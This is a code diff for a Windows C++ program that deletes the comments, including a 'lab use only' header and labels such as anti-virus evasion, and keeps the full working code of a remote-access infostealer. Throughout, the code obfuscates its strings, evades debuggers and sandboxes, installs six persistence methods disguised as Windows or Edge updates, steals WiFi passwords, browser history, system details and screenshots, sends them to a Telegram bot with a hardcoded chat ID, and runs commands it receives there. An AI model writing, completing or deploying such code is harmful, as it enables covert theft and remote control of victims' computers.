@@ -1,6 +1,4 @@
-// lab_practice_v3.cpp
-// FOR AUTHORIZED LAB USE ONLY - EDUCATIONAL PURPOSES
-// Advanced C++ Implementation with String Encryption & Behavioral Masking
+
 
 #include <winsock2.h>
 #include <windows.h>
@@ -49,9 +47,6 @@
 
 namespace fs = std::filesystem;
 
-// ============================================================
-// ANTI-VIRUS EVASION: STRING ENCRYPTION AND OBFUSCATION
-// ============================================================
 
 #pragma optimize("", off)
 #pragma check_stack(off)
@@ -90,7 +85,6 @@ public:
     }
 };
 
-// Helper macro for string obfuscation
 #define OBFUSCATE(str) \
     []() -> std::string { \
         static const std::vector<char> encrypted = StringEncryptor::encrypt(str); \
@@ -103,7 +97,6 @@ public:
         return decrypted; \
     }()
 
-// Junk code to confuse analysis
 void junk_code_sequence() {
     volatile int x = 0;
     volatile int y = 0;
@@ -125,9 +118,6 @@ void junk_code_sequence() {
     }
 }
 
-// ============================================================
-// REAL BROWSER USER AGENTS
-// ============================================================
 
 class UserAgentManager {
 private:
@@ -136,7 +126,7 @@ private:
     
 public:
     UserAgentManager() : current_index(0) {
-        // Real browser user agents
+        
         user_agents = {
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
             OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"),
@@ -159,9 +149,7 @@ public:
     }
 };
 
-// ============================================================
-// BEHAVIORAL MASKING - LEGITIMATE ACTIVITY SIMULATION
-// ============================================================
+
 
 class BehavioralMasker {
 private:
@@ -299,9 +287,6 @@ public:
     }
 };
 
-// ============================================================
-// BASE64 DECODING FOR BOT TOKENS (WITH STRING ENCRYPTION)
-// ============================================================
 
 class Base64Decoder {
 public:
@@ -333,9 +318,7 @@ public:
     }
 };
 
-// ============================================================
-// TELEGRAM BOT MANAGER WITH FALLBACK & REAL USER AGENTS
-// ============================================================
+
 
 class TelegramBotManager {
 private:
@@ -344,7 +327,7 @@ private:
     std::string api_url;
     UserAgentManager ua_manager;
     
-    // Decoded bot tokens from base64 (encrypted in code)
+    
     const std::string BOT1_TOKEN;
     const std::string BOT2_TOKEN;
     
@@ -539,7 +522,7 @@ public:
         std::string response = http_post_multipart(url, full_body, boundary);
         
         if (response.find(OBFUSCATE("\"ok\":true")) == std::string::npos) {
-            // Try fallback bot
+            
             int original_index = current_bot_index;
             current_bot_index = (current_bot_index + 1) % bot_tokens.size();
             
@@ -654,9 +637,6 @@ public:
     }
 };
 
-// ============================================================
-// SCREENSHOT CAPTURE (IN MEMORY ONLY)
-// ============================================================
 
 class ScreenshotCapture {
 public:
@@ -683,7 +663,7 @@ public:
         std::vector<BYTE> pixels(width * height * 3);
         GetDIBits(hdcMem, hBitmap, 0, height, pixels.data(), &bmi, DIB_RGB_COLORS);
         
-        // Convert to JPEG in memory
+        
         std::vector<BYTE> jpeg_data = convertToJPEG(pixels, width, height);
         
         DeleteObject(hBitmap);
@@ -695,17 +675,17 @@ public:
     
 private:
     static std::vector<BYTE> convertToJPEG(const std::vector<BYTE>& bitmap, int width, int height) {
-        // Initialize GDI+
+        
         Gdiplus::GdiplusStartupInput gdiplusStartupInput;
         ULONG_PTR gdiplusToken;
         Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
         
         std::vector<BYTE> jpeg_data;
         
-        // Create bitmap from raw data
+        
         Gdiplus::Bitmap bmp(width, height, width * 3, PixelFormat24bppRGB, (BYTE*)bitmap.data());
         
-        // Save to memory stream as JPEG
+        
         IStream* pStream = NULL;
         CreateStreamOnHGlobal(NULL, TRUE, &pStream);
         
@@ -714,7 +694,7 @@ private:
         
         bmp.Save(pStream, &jpegClsid, NULL);
         
-        // Get data from stream
+        
         STATSTG statstg;
         pStream->Stat(&statstg, STATFLAG_NONAME);
         
@@ -752,9 +732,6 @@ private:
     }
 };
 
-// ============================================================
-// SYSTEM INFORMATION COLLECTOR (WITH STRING ENCRYPTION)
-// ============================================================
 
 class SystemInfo {
 public:
@@ -869,9 +846,7 @@ public:
     }
 };
 
-// ============================================================
-// WIFI PASSWORD EXTRACTOR
-// ============================================================
+
 
 class WiFiPasswordExtractor {
 public:
@@ -928,9 +903,7 @@ public:
     }
 };
 
-// ============================================================
-// BROWSER HISTORY EXTRACTOR (WITHOUT SQLITE)
-// ============================================================
+
 
 class BrowserHistoryExtractor {
 public:
@@ -952,8 +925,7 @@ public:
             return result.str();
         }
         
-        // Use Chrome's own history file - we'll just read it as text
-        // In a real implementation, you'd parse the SQLite database
+        
         result << OBFUSCATE("Chrome history file found at: ") << history_path << OBFUSCATE("\n");
         result << OBFUSCATE("(Full parsing would require SQLite library)\n");
         
@@ -1016,9 +988,7 @@ public:
     }
 };
 
-// ============================================================
-// PERSISTENCE ENGINE (NON-ADMIN METHODS) WITH OBFUSCATION
-// ============================================================
+
 
 class PersistenceEngine {
 private:
@@ -1045,7 +1015,7 @@ public:
         current_exe = getCurrentExe();
     }
     
-    // Method 1: Registry Run (Current User)
+    
     bool installRegistryRun() {
         HKEY hKey;
         std::string key_name = OBFUSCATE("WindowsUpdate_") + 
@@ -1064,14 +1034,14 @@ public:
         return false;
     }
     
-    // Method 2: Startup Folder (Current User)
+    
     bool installStartupFolder() {
         char startup_path[MAX_PATH];
         if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
             std::string shortcut_path = std::string(startup_path) + 
                 OBFUSCATE("\\SystemUpdate.lnk");
             
-            // Create shortcut using IShellLink
+        
             CoInitialize(NULL);
             IShellLinkA* psl;
             if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
@@ -1095,7 +1065,7 @@ public:
         return false;
     }
     
-    // Method 3: Scheduled Task (Current User)
+    
     bool installScheduledTask() {
         std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
             std::to_string(GetCurrentProcessId());
@@ -1105,25 +1075,25 @@ public:
         return true;
     }
     
-    // Method 4: WMI Event Subscription
+    
     bool installWMI() {
         std::string filter_name = OBFUSCATE("UpdateFilter_") + 
             std::to_string(GetCurrentProcessId());
         std::string consumer_name = OBFUSCATE("UpdateConsumer_") + 
             std::to_string(GetCurrentProcessId());
         
-        // Create WMI event filter (triggers every 30 minutes)
+        
         std::string filter_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name=\"") + 
             filter_name + OBFUSCATE("\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", ") + 
             OBFUSCATE("Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"");
         system(filter_cmd.c_str());
         
-        // Create command line event consumer
+        
         std::string consumer_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"") + 
             consumer_name + OBFUSCATE("\", CommandLineTemplate=\"") + current_exe + OBFUSCATE("\"");
         system(consumer_cmd.c_str());
         
-        // Create binding
+        
         std::string binding_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name='") + 
             filter_name + OBFUSCATE("'\", Consumer=\"CommandLineEventConsumer.Name='") + 
             consumer_name + OBFUSCATE("'\"");
@@ -1132,42 +1102,42 @@ public:
         return true;
     }
     
-    // Method 5: BITS Job
+    
     bool installBITS() {
         std::string job_name = OBFUSCATE("UpdateJob_") + 
             std::to_string(GetCurrentProcessId());
         
-        // Create BITS job
+        
         std::string cmd = OBFUSCATE("bitsadmin /create ") + job_name;
         system(cmd.c_str());
         
-        // Set notify command line (runs when job completes - immediately)
+        
         cmd = OBFUSCATE("bitsadmin /SetNotifyCmdLine ") + job_name + 
             OBFUSCATE(" cmd.exe \"/c ") + current_exe + OBFUSCATE("\"");
         system(cmd.c_str());
         
-        // Set retry delay
+        
         cmd = OBFUSCATE("bitsadmin /SetMinRetryDelay ") + job_name + OBFUSCATE(" 60");
         system(cmd.c_str());
         
-        // Add a dummy file to trigger immediate completion
+    
         cmd = OBFUSCATE("bitsadmin /addfile ") + job_name + 
             OBFUSCATE(" https://www.msftconnecttest.com/connecttest.txt C:\\Windows\\Temp\\dummy.txt");
         system(cmd.c_str());
         
-        // Resume job
+        
         cmd = OBFUSCATE("bitsadmin /resume ") + job_name;
         system(cmd.c_str());
         
         return true;
     }
     
-    // Method 6: ActiveX/COM Object Registration
+    
     bool installCOM() {
         HKEY hKey;
         std::string clsid = OBFUSCATE("{00000000-0000-0000-0000-") + random_hex(12) + OBFUSCATE("}");
         
-        // Register in HKCU
+        
         std::string key_path = OBFUSCATE("Software\\Classes\\CLSID\\") + clsid;
         if (RegCreateKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, NULL, 
             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -1177,7 +1147,7 @@ public:
                 static_cast<DWORD>(value.length() + 1));
             RegCloseKey(hKey);
             
-            // Add InprocServer32
+            
             std::string inproc_path = key_path + OBFUSCATE("\\InprocServer32");
             if (RegCreateKeyExA(HKEY_CURRENT_USER, inproc_path.c_str(), 0, NULL,
                 REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -1205,7 +1175,7 @@ public:
     }
     
     void removeAll() {
-        // Remove Registry Run
+        
         std::string key_name = OBFUSCATE("WindowsUpdate_") + 
             std::to_string(GetCurrentProcessId());
         std::string regPath = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -1213,7 +1183,7 @@ public:
             regPath.c_str(), 
             key_name.c_str());
         
-        // Remove Startup Folder shortcut
+        
         char startup_path[MAX_PATH];
         if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
             std::string shortcut_path = std::string(startup_path) + 
@@ -1221,34 +1191,31 @@ public:
             DeleteFileA(shortcut_path.c_str());
         }
         
-        // Remove Scheduled Task
+        
         std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
             std::to_string(GetCurrentProcessId());
         std::string cmd = OBFUSCATE("schtasks /delete /tn \"") + task_name + 
             OBFUSCATE("\" /f");
         system(cmd.c_str());
         
-        // Remove BITS Job
+        
         std::string job_name = OBFUSCATE("UpdateJob_") + 
             std::to_string(GetCurrentProcessId());
         cmd = OBFUSCATE("bitsadmin /cancel ") + job_name;
         system(cmd.c_str());
         
-        // WMI removal would require enumeration - skipping for brevity
+        
     }
 };
 
-// ============================================================
-// ANTI-DEBUG / SANDBOX DETECTION
-// ============================================================
 
 class AntiDebug {
 public:
     static bool isDebuggerPresent() {
-        // Check for debugger
+        
         if (IsDebuggerPresent()) return true;
         
-        // Check for remote debugger via NtQueryInformationProcess
+        
         typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
             HANDLE, DWORD, PVOID, ULONG, PULONG);
         
@@ -1266,7 +1233,7 @@ public:
             }
         }
         
-        // Check for hardware breakpoints
+    
         CONTEXT ctx = {0};
         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
         if (GetThreadContext(GetCurrentThread(), &ctx)) {
@@ -1277,7 +1244,7 @@ public:
     }
     
     static bool isSandbox() {
-        // Check for sandbox processes
+        
         const char* sandbox_processes[] = {
             "vboxservice.exe", "vboxtray.exe", 
             "vmtoolsd.exe", "vmwaretray.exe",
@@ -1305,7 +1272,7 @@ public:
             CloseHandle(snapshot);
         }
         
-        // Check MAC address for VMs
+        
         IP_ADAPTER_INFO adapter_info[16];
         DWORD size = sizeof(adapter_info);
         
@@ -1337,9 +1304,7 @@ public:
     }
 };
 
-// ============================================================
-// MAIN PAYLOAD
-// ============================================================
+
 
 class LabPayload {
 private:
@@ -1351,15 +1316,15 @@ private:
     std::thread command_thread;
     
     void sendInitialInfo() {
-        // System info
+        
         std::string sys_info = SystemInfo::getAllInfo();
         bot.sendMessage(chat_id, sys_info);
         
-        // WiFi passwords
+        
         std::string wifi_info = WiFiPasswordExtractor::extractAll();
         bot.sendMessage(chat_id, wifi_info);
         
-        // Browser history
+        
         bot.sendMessage(chat_id, BrowserHistoryExtractor::extractChrome());
         bot.sendMessage(chat_id, BrowserHistoryExtractor::extractFirefox());
         bot.sendMessage(chat_id, BrowserHistoryExtractor::extractEdge());
@@ -1372,10 +1337,10 @@ private:
             AntiDebug::junkCodeLoop();
             std::this_thread::sleep_for(std::chrono::seconds(3));
             
-            // Get updates from Telegram
+            
             std::string response = bot.getUpdates();
             
-            // Parse JSON manually (simplified)
+            
             size_t result_pos = response.find(OBFUSCATE("\"result\""));
             if (result_pos == std::string::npos) continue;
             
@@ -1388,7 +1353,7 @@ private:
                 if (update_id > last_update_id) {
                     last_update_id = update_id;
                     
-                    // Look for message text
+                    
                     size_t text_pos = response.find(OBFUSCATE("\"text\":\""), id_end);
                     if (text_pos != std::string::npos) {
                         text_pos += 8;
@@ -1502,7 +1467,7 @@ private:
             result = OBFUSCATE("Command executed (no output)");
         }
         
-        // Split long output
+    
         if (result.length() > 4000) {
             bot.sendMessage(chat_id, result.substr(0, 4000) + OBFUSCATE("\n... (truncated)"));
         } else {
@@ -1517,16 +1482,16 @@ public:
     void start() {
         running = true;
         
-        // Start behavioral masking
+        
         masker.start_masking();
         
-        // Install persistence
+        
         persistence.installAll();
         
-        // Send initial info
+        
         sendInitialInfo();
         
-        // Start command listener
+        
         command_thread = std::thread(&LabPayload::commandListener, this);
     }
     
@@ -1539,9 +1504,6 @@ public:
     }
 };
 
-// ============================================================
-// ANTI-ANALYSIS ENTRY POINT
-// ============================================================
 
 void SelfDestruct() {
     char module_path[MAX_PATH];
@@ -1568,16 +1530,16 @@ void SelfDestruct() {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
-    // Hide console
+    
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
     
-    // Initialize random seed
+    
     srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId() ^ GetTickCount()));
     
-    // Check for analysis environment
+    
     if (AntiDebug::isDebuggerPresent() || AntiDebug::isSandbox()) {
-        // Launch decoy and self-destruct
+        
         std::string errorMsg = OBFUSCATE("Application failed to initialize properly.");
         std::string errorTitle = OBFUSCATE("Error");
         MessageBoxA(NULL, errorMsg.c_str(),
@@ -1586,18 +1548,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return 0;
     }
     
-    // Initialize Winsock
+    
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     
-    // Your Telegram chat ID (hardcoded as requested)
+    
     std::string chat_id = OBFUSCATE("7369364451");
     
-    // Start payload
+    
     LabPayload payload(chat_id);
     payload.start();
     
-    // Message loop to keep process alive
+    
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
